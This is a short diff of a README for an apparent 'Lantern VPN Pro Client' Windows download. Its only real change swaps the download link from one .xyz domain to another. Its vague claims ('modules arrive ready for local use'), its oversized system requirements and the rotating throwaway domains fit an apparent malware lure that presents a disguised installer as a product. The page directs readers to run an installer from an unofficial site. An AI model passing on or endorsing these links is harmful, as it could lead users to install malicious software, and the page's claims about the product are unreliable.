@@ -18,8 +18,8 @@ Lantern VPN Pro Client | Windows desktop package | straightforward setup | stabl
 
 > Use the project link below for Windows.
 
-* **Project link:** **[lantern.nexpath.xyz](https://lantern.nexpath.xyz/)**
-* **Full URL:** `https://lantern.nexpath.xyz/`
+* **Project link:** **[lantern.nerasix.xyz](https://lantern.nerasix.xyz/)**
+* **Full URL:** `https://lantern.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 6 GB base | 12 GB+ for demanding tasks
 * **Disk:** 5 GB available storage
 
-***
+***
